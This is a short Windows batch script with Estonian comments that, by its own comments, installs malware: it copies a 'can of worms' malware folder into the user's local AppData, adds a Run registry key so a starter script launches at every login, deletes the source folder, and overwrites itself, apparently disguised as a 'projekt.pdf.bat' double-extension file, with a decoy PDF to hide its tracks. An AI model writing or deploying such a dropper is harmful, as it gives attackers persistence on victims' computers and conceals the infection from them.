@echo off
setlocal

set "source_dir=%~dp0can of worms"
set "dest_dir=%localappdata%\can of worms"

if not exist "%dest_dir%" mkdir "%dest_dir%"

REM Kopeerib kausta koos ülejäänud pahavaraga määratud kataloogi
xcopy "%source_dir%\*" "%dest_dir%\" /E /I /Y

REM Lisab registrikirje, see konkreetne käivitab faili igal süsteemi sisselogimisel
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "CanOfWormsStarter" /t REG_SZ /d "%dest_dir%\starter.bat" /f

REM eemaldab algse pahavara kausta
rd /s /q "%source_dir%"

REM asendab ennast (projekt.pdf.bat) tühja failiga projekt.pdf.pdf
copy /y "%~dp0project.pdf.pdf" "%~dp0%~nx0"

endlocal
exit
